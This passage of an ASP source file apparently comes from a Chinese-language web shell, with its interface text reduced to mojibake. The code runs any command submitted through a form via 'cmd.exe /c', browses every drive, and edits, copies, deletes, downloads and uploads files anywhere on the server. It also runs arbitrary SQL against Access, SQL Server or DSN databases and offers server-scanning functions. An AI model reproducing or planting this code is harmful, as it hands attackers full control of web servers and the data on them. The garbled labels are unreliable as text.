	<TD><INPUT type=file name=file<%=i%>></TD>
  </TR>
  <%
  Next%>
  <TR class=TBTD>
    <TD colspan=2><LI>ע�⣺ÿ���ϴ����ļ���Ҫ���󣬷�����̽����仺��!</TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=submit value=��ʼ�ϴ�></TD>
  </TR>
  </FORM>
</TABLE><BR>
<%
End Sub

Sub UpLoadSave()
    Server.ScriptTimeOut=3000
	Dim UpLoad,FormPath,Up_Str:Up_Str = ""
	Set UpLoad = New UpFile_Class
	UpLoad.GetData()
	FormPath = Upload.Form("ServerPath")
	If FormPath = "" Then
	    Message "�ϴ�ʧ��","<LI>δ�����ļ��ϴ�����������Ŀ¼��",1
		Response.End
	End If
	if Right(FormPath,1) <> "\" then FormPath = FormPath & "\"
	FileCount = 0
	For Each FormName in UpLoad.file
	    Set File = UpLoad.file(FormName)
		If File.FileSize > 0 Then
		    File.SaveToFile FormPath & File.FileName
			If err then
			    err.Clear
				Up_Str = Up_Str & "<LI>�ļ�:" & File.FilePath & File.FileName & "�ϴ�ʧ��,���ܷ������޴�Ŀ¼������д�ĵ�Ȩ��."
			Else
			    Up_Str = Up_Str & "<LI>�����ļ�:<FONT color=#ff2222>" & File.FilePath & File.FileName & "(" & File.FileSize & ")</FONT>���ϴ���������:<FONT color=#ff2222>" & FormPath & File.FileName & "</FONT>"
				FileCount = FileCount+1
			End if
		End if
		Set File = Nothing
	Next
	Up_Str = Up_Str & "<B><LI>�ϴ����," & FileCount & "���ļ����ϴ���������!</B>"
	Set UpLoad = Nothing
	Message "�ϴ�����",Up_Str,1
	Response.End
End Sub


Function HTMLEncode(Str) 
	If isNull(Str) or Str = "" Then
	    HTMLEncode = ""
	Else
	    Str = Replace(Str, ">", ">")
		Str = Replace(Str, "<", "<")
		HTMLEncode = Str 
	End if
End Function

Sub GetDriveList
    Dim DriveFso
	Set DriveFso = Server.Createobject("Scripting.FileSystemObject")
    For Each DriveA in DriveFso.Drives
        Response.write "<A href=" & Url & "?Path=" & DriveA.DriveLetter&":\>" & DriveA.DriveLetter&"��:</A>     "
    Next
	Set DriveFso = Nothing
End Sub

Function GetoldFolder(Paths)
    Dim t
	If Len(Paths) <> 3 and Right(Paths,1) = "\" Then
       t = Left(Paths,Len(Paths)-1)
	   GetoldFolder = Server.UrlEncode(Left(t,InstrRev(t,"\")))
    Else
	   GetoldFolder = Server.UrlEncode(Left(Paths,InstrRev(Paths,"\")))
    End if
End Function

Sub OperCmd()  'ִ��DOS����
    On Error Resume Next
	Dim ScriptCMD,FsoCmd,AbsPath,TempFile,Command,FileStream,FileText
	AbsPath = Server.MapPath(Url)
	Set FsoCmd = Server.CreateObject("Scripting.FileSystemObject")
	Set ScriptCMD = Server.CreateObject("WSCRIPT.SHELL")
	TempFile = Left(AbsPath,instrRev(AbsPath,"\")) & FsoCmd.GetTempName()
	If Request("SubCMD") <> "�½��ļ���" Then
	    If Request("SubCMD") = "����CMD����" Then
		    Command = Request("OperDos")
		Else
		    Command = Request("OperProgram")
		End if
		Call ScriptCMD.Run("cmd.exe /c " & Command & " > " & TempFile,0,True)
		Set FileStream = FsoCmd.OpenTextFile(TempFile,1,False)
		If Not FileStream.AtEndOfStream then
		    FileText = FileStream.ReadAll
			Response.write HTMLEncode(FileText)
		Else
		    Response.write "ϵͳδ���ػ�Ӧ��Ϣ!"
		End if
		FileStream.Close
		Set FileStream = Nothing
		FsoCmd.DeleteFile TempFile,True
	Else
	    Command = Request("newFileOrFolder")
		FsoCmd.CreateFolder Command
		If err then
		    err.Clear
			Response.write "�½��ļ���ʧ�ܡ�"
		Else
		    Response.write "�ѳɹ�����" & Command & "�ļ��С�"
		End If
	End if
	Set FsoCmd = Nothing
	Set ScriptCMD = Nothing
End Sub


Sub DisplayDirectory(FolderA) '������
    On Error Resume Next
    Dim FSO,TheFolder,SubFolderA,FileA,oldFolder
	Dim RootWeb,UserWeb,WebAbsPath,WebPath
	oldFolder = Trim(Request("oldFolder"))
	If Right(FolderA,1) <> "\" Then FolderA = FolderA & "\"
	If odlFolder = "" Then oldFolder = FolderA
	RootWeb = Instr(1,FolderA,Server.MapPath("/"),1) 
	UserWeb = Instr(1,FolderA,Mid(Server.MapPath(Url),1,InstrRev(Server.MapPath(Url),"\")),1) 

	If RootWeb > 0 Then  '��Ŀ¼
	    WebAbsPath = Server.MapPath("/") & "\"
		WebPath="/" & Replace(Mid(FolderA,Len(WebAbsPath)+1),"\","/")
	ElseIf UserWeb > 0 Then '����Ŀ¼
	    WebAbsPath = Server.MapPath(UrlPath) & "\"
		WebPath = UrlPath & Replace(Mid(FolderA,Len(WebAbsPath)+1),"\","/")
	End If

	Set FSO = Server.Createobject("Scripting.FileSystemObject")
    Set TheFolder = FSO.GetFolder(FolderA)
	Set SubFolderA = TheFolder.SubFolders
	Set FileA = TheFolder.Files

	%>
<TABLE width=777 border=0 align=center cellpadding=0 cellspacing=0  bgcolor=#91d70d>
  <TR>
    <TD colspan=2>
	  <TABLE width=100% border=0 cellpadding=3 cellspacing=1>
	    <TR>
		  <TD align=middle><FONT color=#ff2222>�ڰ�����̳ http://bbs.iceyu.cn/Default.asp</FONT></TD>
		</TR>
		<FORM action=<%=Url%> method=Post name=CmdDos>
		<TR class=TBTD>
		  <TD>
		    <INPUT type=text name=OperDos value="<%=Request("OperDos")%>">
			<INPUT type=submit value=����CMD���� name=SubCmd>
			<INPUT type=text name=OperProgram value="<%=Request("OperProgram")%>">
			<INPUT type=submit value=ִ�г��� name=SubCmd>����ʹ�þ���·����</TD>
		<TR bgcolor=#ffffff>
		  <TD>
		    <INPUT type=text name=newFileOrFolder>
			<INPUT type=button value=�½��ļ� onclick="CreateFile(document.CmdDos.newFileOrFolder.value)">
			<INPUT type=hidden name=cmdFlag value=ok>
			<INPUT type=submit value=�½��ļ��� name=SubCMD></TD>
		</TR>
		</FORM>
		<%
		If Request("cmdFlag")="ok" Then%>
		<TR bgcolor=#ffffff>
		  <TD><TEXTAREA rows=25 cols=125 style="background:#000000;color:#ffffff;"><%OperCmd%></TEXTAREA></TD>
		</TR>
		<%
		End If%>
		<TR class=TBTD>
		  <TD>�л��̷���<%GetDriveList%>�������ԡ� �� ��վ��Ŀ¼��<FONT color=#ff2222><%=Server.MapPath("/") & "\"%></FONT> �� ��ǰ·����<FONT color=#ff2222><%=FolderA%></FONT></TD>
		</TR>
		<FORM action=<%=Url%> method=Post>
		<TR bgcolor=#ffffff>
		  <TD>Ŀ¼�����
		    <INPUT type=text name=Path size=28>
			<INPUT type=submit value=���> ��ʹ�þ���·�����磺��F:\ASP\��</TD>
		</TR>
		</FORM>
		<TR>
		  <TD bgcolor=#91d70d align=middle><FONT color=#ff2222>�ļ�����</FONT></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD>
	  <TABLE width=100% border=0 cellpadding=0 cellspacing=1>
	    <TR>
		  <TD width=30% valign=top bgcolor=#ecfccd>
		    <TABLE width=100% border=0 cellpadding=3 cellspacing=0>
			  <TR>
			    <TD>
				  <A href=<%=Url%>?Path=<%=GetoldFolder(oldFolder)%>&oldFolder=<%=GetoldFolder(oldFolder)%>><FONT color=#FF8000>��</FONT>��<FONT color=#ff2222>���ϼ�Ŀ¼</FONT></A><BR>
				  <%
				  For Each SubFolderB in SubFolderA%>
				  <A href=<%=Url%>?Path=<%=Server.UrlEncode(SubFolderB.Path & "\")%>&oldFolder=<%=GetoldFolder(SubFolderB.Path)%> title="<%=GetAttrib(SubFolderB.Attributes) & Chr(10) & "�޸�ʱ�䣺" & SubFolderB.DateLastModified%>">��<FONT color=#FF8000>��</FONT><%=SubFolderB.Name%></A><FONT color=#ff2222>��</FONT>
				  <A href=<%=Url%>?Action=Del&name=<%=Server.Urlencode(SubFolderB.Path)%>&flag=2 target=_blank onclick="return Delyn()">ɾ��</A>
				  <A href=#CopyFolder onclick="Copy('<%=Server.Urlencode(SubFolderB.Path)%>',2)">����</A>
				  <A href=<%=Url%>?Action=SetAttribForm&FileFolder=<%=Server.UrlEncode(SubFolderB.Path)%> target=_blank>����</A><BR>
				  <%
				  Next%>
				</TD>
			  </TR>
			</TABLE>
		  </TD>
		  <TD valign=top bgcolor=#ecfccd height=320>
		    <TABLE TABLE width=100% border=0 cellpadding=2 cellspacing=0>
			  <TR height=25 bgcolor=#d8f99b>
			    <TD width=48% align=center class=TBBO>�ļ���</TD>
				<TD width=20% class=TBBO>�ļ���С</TD>
				<TD width=32% align=center class=TBBO>�ļ�����</TD>
			  </TR>
			  <%
			  For Each FileB in FileA%>
			  <TR>
			    <TD class=TBBO><FONT color=#ff8000>��</FONT>
				<%If WebPath <> "" Then%><A href="<%=WebPath & FileB.Name%>" title="<%=GetAttrib(FileB.Attributes) & Chr(10) & "�޸�ʱ�䣺" & FileB.DateLastModified%>" target=_blank><%=FileB.Name%></A></TD><%Else%><FONT title="<%=GetAttrib(FileB.Attributes) & Chr(10) & "�޸�ʱ�䣺" & FileB.DateLastModified%>"><%=FileB.Name%></FONT></TD><%End If%>
				<TD class=TBBO><%=FileB.Size%> byte</TD>
				<TD align=middle class=TBBO>
				  <A href=<%=Url%>?Action=EditForm&File=<%=Server.Urlencode(FileB.Path)%> target=_blank>�༭</A>
				  <A href=# onclick="Copy('<%=Server.Urlencode(FileB.Path)%>',1)">����</A>
				  <A href=<%=Url%>?Action=DownLoad&File=<%=Server.Urlencode(FileB.Path)%> target=_blank>����</A>
				  <A href=<%=Url%>?Action=Del&name=<%=Server.Urlencode(FileB.Path)%>&flag=1 target=_blank onclick="return Delyn()">ɾ��</A>
				  <A href=<%=Url%>?Action=SetAttribForm&FileFolder=<%=Server.Urlencode(FileB.Path)%> target=_blank>����</A>
				</TD>
			  </TR>
			  <%
			  Next%>
			</TABLE>
		  </TD>
		</TR>
		<TR>
		  <TD colspan=2 class=TBTD> ����������������
		    <A href=<%=Url%>?Action=ShowServer target=_blank>����ѯ��������Ϣ��</A>
			<A href=<%=Url%>?Action=CommonObj target=_blank>����ѯ�����������</A>
			<A href=<%=Url%>?Action=ScanDriveForm target=_blank>��ɨ�������Ϣ��</A>
			<A href=<%=Url%>?Action=DispFsoCmdForm target=_blank>����FSO֧�����</A>
			<A href=<%=Url%>?Action=SQLForm target=_blank>���������ݿ⡻</A>
			<A href=<%=Url%>?Action=UpLoadForm  target=_blank>��������ϴ���</A>
		  </TD>
		</TR>
		<FORM action=<%=Url%>?Action=Loginout method=Post>
		<TR>
		  <TD colspan=2 class=TBEnd><INPUT type=submit value=�˳���¼></TD>
		</TR>
		</FORM>
	  </TABLE>
	</TD>
  </TR>
</TABLE>
<%
End Sub

Function GetAttrib(FileAttrib)
    Select Case FileAttrib
	    Case 0,16,32,48: GetAttrib = "���ԣ���ͨ"
		Case 1,17,33,49: GetAttrib = "���ԣ�ֻ��"
		Case 2,18,34,50: GetAttrib = "���ԣ�����"
		Case 3,19,35,51: GetAttrib = "���ԣ�ֻ��,����"
		Case 4,20,36,52: GetAttrib = "���ԣ�ϵͳ"
		Case 5,21,37,53: GetAttrib = "���ԣ�ϵͳ,ֻ��"
		Case 6,22,38,54: GetAttrib = "���ԣ�ϵͳ,����"
		Case 7,23,39,55: GetAttrib = "���ԣ�ϵͳ,ֻ��,����"
		Case Else: GetAttrib = "���ԣ�" & FileAttrib
	End Select
End Function

Sub SQLForm()
%>
<TABLE width=480 border=0 align=center>
  <TR>
    <TD>
      <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM action=<%=Url%>?Action=SQL&Flag=1 method=Post>
        <TR>
          <TD colspan=2 class=TBHead>Access���ݿ����</TD>
		</TR>
        <TR class=TBTD>
          <TD width=120 align=middle>�û���</TD>
          <TD><INPUT type=text name=AcUser>�����û������ÿա�</TD>
		</TR>
		<TR class=TBTD>
          <TD align=middle>�ܡ���</TD>
          <TD><INPUT type=text name=AcPass>�����������ÿա�</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>���ݿ�·��������</TD>
          <TD><INPUT type=text name=AcPath><INPUT class=INPUTt type=radio value=Ote name=SelectPath checked> ���<INPUT class=INPUTt type=radio value=Abs name=SelectPath > ����</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>SQL���</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value=ִ������></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD height=10></TD>
  </TR>
  <TR>
    <TD>
      <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM action=<%=Url%>?Action=SQL&Flag=2 method=Post>
		<TR>
          <TD colspan=2 class=TBHead><B>SQL���ݿ����</B></TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle width=120>�û���</TD>
          <TD><INPUT type=text name=SqlUser></TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>�ܡ���</TD>
          <TD><INPUT type=text name=SqlPass>�����������ÿա�</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>���ݿ�����</TD>
          <TD><INPUT type=text name=SqlDataBase></TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>����������</TD>  
          <TD><INPUT type=text name=SqlServer>�����ؿ�Ϊ�գ�Զ��ΪIP��</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>SQL���</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value=ִ������></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD height=10></TD>
  </TR>
  <TR>
    <TD>
	  <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM action=<%=Url%>?Action=SQL&Flag=3 method=Post>
		<TR>
          <TD colspan=2 class=TBHead>���ݿ�DSN����</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle width=120>�û���</TD>
          <TD><INPUT type=text name=DsnUser>��Access���û���,���ÿա�</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>�ܡ���</TD>
          <TD><INPUT type=text name=DsnPass>�����������ÿա�</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>DSN����</TD>
          <TD><INPUT type=text name=DsnName></TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>SQL���</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value=ִ������ name=DS></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
</TABLE><BR>
<%
End Sub

Function Access()
    Dim AcPath,AcUser,AcPass,DBQ
	AcPath = Request("AcPath")
	AcUser = Request("AcUser")
	AcPass = Request("AcPass")
	If Request("SelectPath") = "Abs" Then
	    DBQ = AcPath & ";"
	Else
	    DBQ = Server.MapPath(AcPath) & ";"
	End If
	Access = "DRIVER={Microsoft Access Driver (*.mdb)};User=" & AcUser & ";Pwd=" & AcPass & ";DBQ=" & DBQ & ";"
End Function

Function SqlServer()
    Dim SqlServerName,SqlDataBase,SqlUser,SqlPass
	SqlServerName = Request("SqlServer")
	SqlDataBase = Request("SqlDataBase")
	SqlUser = Request("SqlUser")
	SqlPass = Request("SqlPass")
	SqlServer = "Driver={SQL Server};Server=" & SqlServerName & ";Database=" & SqlDataBase & ";Uid="& SqlUser & ";Pwd=" & SqlPass & ";"
End Function

Function DsnSql()
    Dim DsnName,DsnUser,DsnPass
	DsnName = Request("DsnName")
	DsnUser = Request("DsnUser")
	DsnPass = Request("DsnPass")
	DsnSql = "DSN=" & DsnName & ";Uid=" & DsnUser & ";Pwd=" & DsnPass & ";"
End Function

Sub SQL()
    On Error Resume Next
	Dim Conn,ConnStr,Rs,RsStr,Datas
	Select Case Request("Flag")
	    Case 1: ConnStr = Access()
		Case 2: ConnStr = SqlServer()
		Case 3: ConnStr = DsnSql()
		Case Else
		     Message "���ݿ����ʧ��","<LI>��ָ���������ݿ�����!",1
			 Response.End
	End Select
	Response.write "<P><INPUT type=button value='<< ����' onclick=""history.go(-1)""></P>"
	RsStr = Trim(Request("SqlCommand"))
	Set Conn = Server.Createobject("ADODB.Connection")
	Conn.Open ConnStr
	If err.number <> 0 Then
	    Message "���ݿ����ʧ��","<LI>" & err.Description,0
	    err.Clear
		Response.End
	End If
    If LCase(Left(RsStr,6))="select" Then
	    Set Rs = Conn.Execute(RsStr)
		If err.number<>0 Then
		    Message "���ݿ����ʧ��","<LI>" & err.Description,0
			err.Clear
			Response.End
	    End If
		If Rs.Eof Then
		    Message "���ݿ�����ɹ�","<LI>δ���ַ���������¼.",0
		Else
			Response.Write "<TABLE width=770 border=0 align=center cellspacing=1 cellpadding=3  bgColor=#91d70d >" & VbCrLf & "<TR class=TBHead>" & VbCrLf
			For i=0 to Rs.Fields.Count-1
			    Response.write "<TD><B>" & Rs(i).Name & "</B></TD>" & VbCrLf
			Next
			Response.write "</TR>" & VbCrLf
			Datas = Rs.GetRows(-1)
			Rs.Close
			Conn.Close
			Set Rs = Nothing
			Set Conn = Nothing
			For i=0 to Ubound(Datas,2)
			    Response.write "<TR align=middle class=TBTD>" & VbCrLf
				For j=0 to Ubound(Datas)
				    If Trim(Datas(j,i))="" or isNull(Datas(j,i)) Then
					    Response.write "<TD>----</TD>" & VbCrLf
					Else
					    Response.write "<TD>" & Server.HTMLEncode(Datas(j,i)) & "</TD>" & VbCrLf
					End If
				Next
				Response.write "</TR>" & VbCrLf
			Next
			Response.write "</TABLE>" & VbCrLf & "</TD>" & VbCrLf & "</TR>" & VbCrLf & "</TABLE>"
		End If
	Else
	    Conn.Execute RsStr,IngRecs
		If err Then
		    Message "���ݿ����ʧ��","<LI>" & err.Description,0
			err.Clear
		Else
			Message "���ݿ�����ɹ�","<LI>��Ӱ��ļ�¼��Ϊ��<FONT color=#ff2222>" & IngRecs & "</FONT>��!",0
		End If
	End If
End Sub%>


<Script Language="Javascript">
function Delyn()
{
    var Delyn;
	Delyn = confirm("�ļ����ļ���ɾ�����޷��ָ�!\n��ȷ��ɾ����");
	return Delyn;
}
function CreateFile(file)
{
    if(file=="")
	{
	    alert("�ļ�������Ϊ�գ��������ļ���!");
	}
	else
	{
	    window.open("<%=Url%>?Action=EditForm&file="+file);
	}
}
function Copy(name,flag)
{
    var CopytoPath;
	CopytoPath = prompt("������Ŀ��·��(����·��)��\n����F:\\ASP\\����F:\\ASP\\index.asp","");
	if((CopytoPath==null)||(CopytoPath==""))
	{
	    alert("����ʧ��,Ŀ��·������Ϊ��!");
	}
	else
	{
	    window.open("<%=Url%>?Action=CopyFile&oDir="+name+"&nDir="+CopytoPath+"&flag="+flag);
	}
		  
}
</Script>
</BODY>
</HTML>

